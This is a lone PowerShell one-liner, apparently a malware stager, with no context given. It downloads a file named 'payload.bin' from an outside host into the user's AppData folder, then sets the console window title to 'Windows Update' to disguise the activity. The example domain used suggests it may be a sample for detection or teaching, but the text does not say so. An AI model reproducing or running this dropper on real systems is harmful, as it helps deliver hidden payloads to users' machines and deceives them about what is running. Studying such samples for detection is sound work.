
$RemoteUrl = 'http://adatum.com/payload.bin'; $LocalPath = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $LocalPath); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $Host.UI.RawUI.WindowTitle = "Windows Update"
